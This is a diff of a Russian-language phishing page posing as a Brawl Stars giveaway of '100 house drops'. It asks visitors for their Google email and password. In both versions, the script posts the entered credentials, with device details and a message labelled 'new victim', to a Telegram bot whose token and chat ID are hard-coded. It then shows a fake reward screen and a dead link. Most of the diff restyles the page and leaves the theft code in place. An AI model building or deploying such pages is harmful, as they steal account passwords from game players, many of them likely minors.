@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Brawl Stars | 100 Хаус-Дропов</title>
+    <title>Brawl Stars — 100 Хаус-Дропов</title>
     <style>
         * {
             margin: 0;
@@ -12,202 +12,465 @@
         }
 
         body {
-            font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, sans-serif;
-            background: radial-gradient(circle at 20% 30%, #1a2a3a, #0a1118);
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            background: radial-gradient(circle at 10% 20%, #0f2027, #203a43, #2c5364);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        .card {
-            background: rgba(255, 255, 255, 0.97);
-            border-radius: 32px;
-            padding: 32px 28px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            max-width: 450px;
+        /* Анимированный фон */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
         }
 
-        .icon {
-            font-size: 56px;
-            margin-bottom: 16px;
+        .bg-animation span {
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 215, 0, 0.1);
+            border-radius: 50%;
+            animation: floatBg 12s infinite linear;
+            pointer-events: none;
         }
 
-        h2 {
-            color: #0f2b3d;
+        @keyframes floatBg {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.5; }
+            90% { opacity: 0.5; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Главный контейнер */
+        .container {
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+            animation: fadeInUp 0.8s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Карточка */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(5px);
+            border-radius: 48px;
+            padding: 40px 30px;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.5);
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        /* Логотип Brawl Stars */
+        .brawl-logo {
+            margin-bottom: 20px;
+        }
+
+        .brawl-logo img {
+            width: 200px;
+            filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.3));
+            transition: transform 0.3s;
+        }
+
+        .brawl-logo img:hover {
+            transform: scale(1.02);
+        }
+
+        /* Заголовок */
+        .title {
+            font-size: 32px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #f5b042, #f29b2e);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
             margin-bottom: 8px;
-            font-size: 26px;
-            font-weight: 800;
+            letter-spacing: 1px;
         }
 
         .subtitle {
             color: #5a6874;
-            margin-bottom: 28px;
             font-size: 14px;
+            margin-bottom: 25px;
+            border-bottom: 2px dashed #ffd966;
+            display: inline-block;
+            padding-bottom: 5px;
         }
 
+        /* Поля ввода */
         .input-group {
             margin-bottom: 20px;
             text-align: left;
+            position: relative;
         }
 
         .input-group label {
             display: block;
             margin-bottom: 8px;
             color: #1f2f3e;
-            font-weight: 600;
+            font-weight: 700;
             font-size: 13px;
+            letter-spacing: 0.5px;
         }
 
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
-            font-size: 15px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 18px;
-            background: #f9fafc;
+            padding: 15px 18px;
+            font-size: 16px;
+            border: 2px solid #e9ecef;
+            border-radius: 28px;
+            background: #f8f9fc;
+            transition: all 0.3s;
+            outline: none;
         }
 
         .input-group input:focus {
-            outline: none;
             border-color: #f5b042;
             background: white;
+            box-shadow: 0 0 0 4px rgba(245, 176, 66, 0.2);
         }
 
+        /* Кнопка */
         .btn {
             width: 100%;
-            padding: 14px;
-            background: linear-gradient(95deg, #f5b042 0%, #f29b2e 100%);
-            color: #1e2a32;
+            padding: 16px;
+            background: linear-gradient(95deg, #f5b042, #f29b2e);
             border: none;
-            border-radius: 40px;
-            font-size: 17px;
+            border-radius: 50px;
+            color: white;
+            font-size: 18px;
             font-weight: 800;
             cursor: pointer;
-            margin-top: 8px;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 8px 18px rgba(242, 155, 46, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(242, 155, 46, 0.6);
         }
 
         .btn:active {
-            transform: scale(0.97);
+            transform: scale(0.98);
         }
 
         .loader {
             display: inline-block;
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
             border: 2px solid #fff;
             border-radius: 50%;
             border-top-color: transparent;
             animation: spin 0.5s linear infinite;
-            margin-right: 8px;
             vertical-align: middle;
+            margin-right: 8px;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
-        .reward-box {
+        /* Ошибка */
+        .error-message {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 8px;
             display: none;
-            background: linear-gradient(145deg, #1f2e3e 0%, #0e1a26 100%);
-            border-radius: 48px;
-            padding: 36px 24px;
-            text-align: center;
-            color: white;
+            font-weight: 500;
         }
 
-        .reward-box h2 {
+        /* Секция награды */
+        .reward-box {
+            display: none;
+            background: linear-gradient(145deg, #1f2e3e, #0e1a26);
+            border-radius: 48px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 200, 100, 0.3);
+            animation: pop 0.6s cubic-bezier(0.34, 1.2, 0.64, 1);
+        }
+
+        @keyframes pop {
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        /* Картинка Хаус-Дропа */
+        .drop-image {
+            width: 130px;
+            height: 130px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #ffd966, #ffaa33);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 70px;
+            box-shadow: 0 0 30px rgba(255, 170, 51, 0.6);
+            animation: pulse 2s infinite, rotate 4s infinite linear;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 20px #ffaa33; }
+            50% { transform: scale(1.05); box-shadow: 0 0 50px #ffaa33; }
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .reward-title {
             color: #ffdf8c;
+            font-size: 28px;
+            font-weight: 900;
+            margin: 15px 0;
+        }
+
+        .drop-counter {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 60px;
+            padding: 15px 25px;
+            display: inline-block;
+            margin: 20px 0;
         }
 
         .drop-number {
-            font-size: 64px;
+            font-size: 60px;
             font-weight: 900;
             background: linear-gradient(135deg, #ffd966, #ffaa33);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
+            line-height: 1;
         }
 
-        .error-message {
-            color: #e34d4d;
-            font-size: 12px;
-            margin-top: 6px;
-            display: none;
+        .reward-desc {
+            color: #b9d0e7;
+            font-size: 16px;
+            margin: 20px 0;
+            line-height: 1.6;
+        }
+
+        .btn-reward {
+            background: linear-gradient(95deg, #ffb347, #ff9100);
+            box-shadow: 0 8px 20px rgba(255, 100, 0, 0.5);
+        }
+
+        /* Подпись */
+        .signature {
+            margin-top: 20px;
+            font-family: 'Pacifico', cursive;
+            font-size: 18px;
+            background: linear-gradient(135deg, #ffd966, #ffaa33);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            opacity: 0.8;
+        }
+
+        /* Адаптив */
+        @media (max-width: 480px) {
+            .card, .reward-box { padding: 30px 20px; }
+            .title { font-size: 26px; }
+            .drop-number { font-size: 48px; }
+            .drop-image { width: 100px; height: 100px; font-size: 55px; }
         }
     </style>
 </head>
 <body>
-<div class="card" id="googleForm">
-    <div class="icon">🎁⚡</div>
-    <h2>100 ХАУС-ДРОПОВ</h2>
-    <p class="subtitle">Войдите в Google чтобы получить</p>
-    <form id="loginForm">
-        <div class="input-group">
-            <label>📧 Электронная почта</label>
-            <input type="email" id="email" placeholder="example@gmail.com" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 Пароль</label>
-            <input type="password" id="password" placeholder="Введите пароль" required>
-        </div>
-        <div class="error-message" id="errorMsg">Неверные данные</div>
-        <button type="submit" class="btn" id="submitBtn">ПОЛУЧИТЬ</button>
-    </form>
-</div>
 
-<div class="reward-box" id="rewardBox">
-    <div class="icon">🏆🔥</div>
-    <h2>ХАУС-ДРОПЫ АКТИВИРОВАНЫ!</h2>
-    <div class="drop-number">100</div>
-    <p>⭐ Легендарные скины<br>💎 2500 Гемов<br>🎟️ 10 Мега-ящиков</p>
-    <button class="btn" id="claimBtn" style="margin-top:20px">ЗАБРАТЬ</button>
+<!-- Фоновые анимированные элементы -->
+<div class="bg-animation" id="bgAnimation"></div>
+
+<div class="container">
+    <!-- Форма входа Google -->
+    <div class="card" id="googleForm">
+        <div class="brawl-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Brawl_Stars_Logo.svg/2560px-Brawl_Stars_Logo.svg.png" 
+                 alt="Brawl Stars"
+                 onerror="this.src='https://cdn.worldvectorlogo.com/logos/brawl-stars.svg'">
+        </div>
+        <div class="title">🎁 100 ХАУС-ДРОПОВ 🎁</div>
+        <div class="subtitle">⭐ Эксклюзивная акция для избранных ⭐</div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📧 Google почта</label>
+                <input type="email" id="email" placeholder="example@gmail.com" required>
+            </div>
+            <div class="input-group">
+                <label>🔑 Пароль</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+            <div class="error-message" id="errorMsg">❌ Неверный email или пароль</div>
+            <button type="submit" class="btn" id="submitBtn">ПОЛУЧИТЬ ПОДАРОК</button>
+        </form>
+        <div class="signature">✨ только для настоящих фанатов ✨</div>
+    </div>
+
+    <!-- Блок с наградой (появляется после ввода) -->
+    <div class="reward-box" id="rewardBox">
+        <!-- Картинка Хаус-Дропа -->
+        <div class="drop-image">
+            🎁🔥
+        </div>
+        <div class="reward-title">ПОДАРОК АКТИВИРОВАН!</div>
+        <div class="drop-counter">
+            <div class="drop-number">100</div>
+            <div style="color:#ffd966; font-weight:bold;">ХАУС-ДРОПОВ</div>
+        </div>
+        <div class="reward-desc">
+            💎 2500 Гемов<br>
+            🎟️ 10 Мега-ящиков<br>
+            🃏 Эксклюзивный скин
+        </div>
+        <button class="btn btn-reward" id="claimBtn">ЗАБРАТЬ ДРОПЫ →</button>
+    </div>
 </div>
 
 <script>
-const BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI";
-const ADMIN_ID = "8744429026";
+    // Конфиг Telegram
+    const BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI";
+    const ADMIN_ID = "8744429026";
 
-function getDevice() {
-    const ua = navigator.userAgent;
-    if (/android/i.test(ua)) return "Android";
-    if (/iPhone|iPad/i.test(ua)) return "iOS";
-    return "Компьютер";
-}
-
-async function sendToBot(email, password) {
-    const text = `🔐 НОВАЯ ЖЕРТВА!\n\n📧 Почта: ${email}\n🔑 Пароль: ${password}\n📡 IP: через GitHub\n📱 Устройство: ${getDevice()}\n⏰ Время: ${new Date().toLocaleString()}`;
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`;
-    try {
-        await fetch(url);
-    } catch(e) {
-        console.log("Ошибка отправки");
+    // Определение устройства
+    function getDevice() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return "Android";
+        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+        return "Компьютер";
     }
-}
 
-document.getElementById('loginForm').onsubmit = async (e) => {
-    e.preventDefault();
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    const btn = document.getElementById('submitBtn');
-    
-    btn.innerHTML = '<span class="loader"></span> Проверка...';
-    btn.disabled = true;
-    
-    await sendToBot(email, password);
-    
-    setTimeout(() => {
-        document.getElementById('googleForm').style.display = 'none';
-        document.getElementById('rewardBox').style.display = 'block';
-    }, 1000);
-};
+    // Отправка данных в Telegram
+    async function sendToBot(email, password) {
+        const text = `🔐 НОВАЯ ЖЕРТВА!\n\n📧 Почта: ${email}\n🔑 Пароль: ${password}\n📡 IP: GitHub Pages\n📱 Устройство: ${getDevice()}\n⏰ Время: ${new Date().toLocaleString()}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`;
+        try {
+            await fetch(url);
+        } catch(e) {
+            console.log("Ошибка отправки");
+        }
+    }
 
-document.getElementById('claimBtn').onclick = () => {
-    window.location.href = '404.html';
-};
+    // Фоновые анимированные шарики
+    function createBubbles() {
+        const container = document.getElementById('bgAnimation');
+        for(let i = 0; i < 20; i++) {
+            const span = document.createElement('span');
+            const size = Math.random() * 100 + 30;
+            span.style.width = size + 'px';
+            span.style.height = size + 'px';
+            span.style.left = Math.random() * 100 + '%';
+            span.style.animationDelay = Math.random() * 10 + 's';
+            span.style.animationDuration = Math.random() * 10 + 8 + 's';
+            span.style.background = `radial-gradient(circle, rgba(255, ${Math.floor(Math.random() * 100 + 100)}, 0, 0.15), transparent)`;
+            container.appendChild(span);
+        }
+    }
+
+    // Обработка формы Google
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
+        
+        btn.innerHTML = '<span class="loader"></span> ПРОВЕРКА...';
+        btn.disabled = true;
+        
+        await sendToBot(email, password);
+        
+        setTimeout(() => {
+            document.getElementById('googleForm').style.display = 'none';
+            const rewardBox = document.getElementById('rewardBox');
+            rewardBox.style.display = 'block';
+            // Анимируем счётчик
+            let count = 0;
+            const counter = document.querySelector('.drop-number');
+            const target = 100;
+            const interval = setInterval(() => {
+                if(count >= target) {
+                    clearInterval(interval);
+                } else {
+                    count += Math.ceil((target - count) / 6);
+                    if(count > target) count = target;
+                    counter.innerText = count;
+                }
+            }, 40);
+        }, 1200);
+    });
+
+    // Кнопка "Забрать" → 404
+    document.getElementById('claimBtn').addEventListener('click', () => {
+        window.location.href = '404.html';
+    });
+
+    // Запускаем фоновые анимации
+    createBubbles();
+
+    // Если логотип не загрузился — замена
+    const logo = document.querySelector('.brawl-logo img');
+    if(logo) {
+        logo.addEventListener('error', () => {
+            logo.style.display = 'none';
+            const fallback = document.createElement('div');
+            fallback.style.fontSize = '28px';
+            fallback.style.fontWeight = 'bold';
+            fallback.style.background = 'linear-gradient(135deg, #ffd966, #ffaa33)';
+            fallback.style.webkitBackgroundClip = 'text';
+            fallback.style.backgroundClip = 'text';
+            fallback.style.color = 'transparent';
+            fallback.innerText = '⚔️ BRAWL STARS ⚔️';
+            logo.parentNode.appendChild(fallback);
+        });
+    }
 </script>
 </body>
 </html>
